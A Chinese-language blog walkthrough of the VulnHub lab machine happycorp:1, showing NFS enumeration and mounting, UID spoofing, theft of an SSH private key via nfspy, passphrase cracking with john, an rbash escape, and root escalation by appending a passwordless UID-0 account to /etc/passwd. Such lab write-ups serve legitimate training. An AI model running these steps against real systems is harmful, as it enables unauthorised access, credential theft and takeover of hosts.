---
layout: post
title:  "happycorp：1靶机游玩记录"
subtitle: 'happycorp：1靶机游玩记录'
date:   2019-07-22 18:00:00
tags: 靶机
description: '靶机 happycorp'
color: 'rgb(255,165,0)'
cover: 'https://i.loli.net/2019/07/22/5d358243eb11081011.png'
---

#### 前言 


靶机说明下载地址：
https://www.vulnhub.com/entry/happycorp-1,296/

下载后解压执行happycorp_1.ovf复制虚拟机，自动会分配IP地址

#### 探测

扫描了一下靶机IP地址为：192.168.111.131 

使用nmap探测端口
![nmap.png](https://i.loli.net/2019/07/22/5d358175e5f4216022.png)

也可以用rpcinfo命令，rpcinfo 命令会向 RPC 服务器发出 RPC 调用，并显示结果

```
root@kali:~# rpcinfo -p 192.168.111.131
   program vers proto   port  service
    100000    4   tcp    111  portmapper
    100000    3   tcp    111  portmapper
    100000    2   tcp    111  portmapper
    100000    4   udp    111  portmapper
    100000    3   udp    111  portmapper
    100000    2   udp    111  portmapper
    100005    1   udp  38756  mountd
    100005    1   tcp  48565  mountd
    100005    2   udp  37335  mountd
    100005    2   tcp  37845  mountd
    100005    3   udp  57602  mountd
    100005    3   tcp  35557  mountd
    100003    3   tcp   2049  nfs
    100003    4   tcp   2049  nfs
    100227    3   tcp   2049
    100003    3   udp   2049  nfs
    100003    4   udp   2049  nfs
    100227    3   udp   2049
```

showmount -e 检索主机的文件夹
```
root@kali:~# showmount -e 192.168.111.131
Export list for 192.168.111.131:
/home/karl *

```
#### 尝试入侵
使用mount去挂载

```
mount -t nfs 192.168.111.131:/home/karl /ttt
```
![10.png](https://i.loli.net/2019/07/23/5d3665eb44c2a35740.png)
但ssh目录拒绝访问，可以伪造文件所有者的UID来欺骗NFS服务器  
新增一个uid为1001的用户来访问即可

```
echo "test:x:1001:1001::/home/test:/bin/sh" /etc/passwd
```
![11.png](https://i.loli.net/2019/07/23/5d3669a6226c280272.png)

也可以使用nfs利用工具[nfspy说明](https://github.com/bonsaiviking/NfSpy)  
使用nfspy去挂载文件


```
nfspy -o server=192.168.111.131:/home/karl,hide,allow_other,ro,intr /ttt

```
挂载成功，但是访问会报错

```
root@kali:/# cd ttt
bash: cd: ttt: Input/output error

```
卸载ttt

```
fusermount -u /ttt
```
查看nsf和portmap服务正常
![9.png](https://i.loli.net/2019/07/23/5d3662b1cc45361585.png)
查看log也未发现异常,暂时先做个记录。报错原因未知。

使用nfspysh连接没有问题


```
root@kali:/# nfspysh -o server=192.168.111.131:/home/karl
nfspy@192.168.111.131:/home/karl:/> ls
/:
000600   1001   1001          28 2019-03-04 20:55:40 .lesshst
000777      0      0           9 2019-03-05 05:11:30 .bash_history
000755   1001   1001        4096 2019-03-05 05:15:14 .
000644   1001   1001         675 2019-03-04 16:09:13 .profile
000700   1001   1001        4096 2019-03-05 05:10:36 .ssh
000644   1001   1001        3538 2019-03-05 05:15:13 .bashrc
000755   1001   1001        4096 2019-03-05 05:15:14 ..
000644   1001   1001         220 2019-03-04 16:09:13 .bash_logout
#下载文件
nfspy@192.168.111.131:/home/karl:/> cd .ssh
nfspy@192.168.111.131:/home/karl:/.ssh> get id_rsa /temp
nfspy@192.168.111.131:/home/karl:/.ssh> get id_rsa.pub /temp	
nfspy@192.168.111.131:/home/karl:/.ssh> get user.txt /temp
nfspy@192.168.111.131:/home/karl:/.ssh> get authorized_keys /temp
```
![2.png](https://i.loli.net/2019/07/22/5d358244f34f272571.png)
可以看到第一个flag和账户名karl@happycorp  
既然拿到了私钥就尝试登录一下

```
ssh -i id_rsa karl@192.168.111.131
```
![3.png](https://i.loli.net/2019/07/22/5d3582444249282332.png)
发现报错，重新给个权限

```
chmod 600 id_rsa.pub
```
发现需要密码

使用john解密ssh私钥密码


```
#先将私钥转换成可破解的hash值
python /usr/share/john/ssh2john.py id_rsa > hash.txt
#使用john跑密码
john hash.txt
```
![4.png](https://i.loli.net/2019/07/22/5d358244de76c70724.png)
密码爆破出来是sheep

登录成功但发现是rbath
![5.png](https://i.loli.net/2019/07/22/5d3582443217395945.png)
使用交互式绕过
ssh -i id_rsa karl@192.168.111.131 -t /bin/sh

登录后查看权限、可执行命令等
![6.png](https://i.loli.net/2019/07/22/5d3582441ef0962646.png)
使用cp命令覆盖/etc/passwd以达到新增root用户

```
cp /etc/passwd passwd
echo "k::0:0:::/bin/bash" >> passwd
cp passwd /etc/passwd
```

使用k账户登录获取root权限
最后拿到第二个flag
![7.png](https://i.loli.net/2019/07/22/5d358243d7fa871804.png)

#### 总结

1. nfs相关漏洞利用  
2. ssh私钥破解
3. rbash绕过
4. 利用系统可执行命令提权

通过对NFS的Share/Export进行控制来决定哪一台设备可以访问共享目录防止问题出现

参考文档：  
[针对NFS的渗透测试](https://www.freebuf.com/articles/network/159468.html)
[happycorp_1靶机渗透实战](https://www.anquanke.com/post/id/181786)
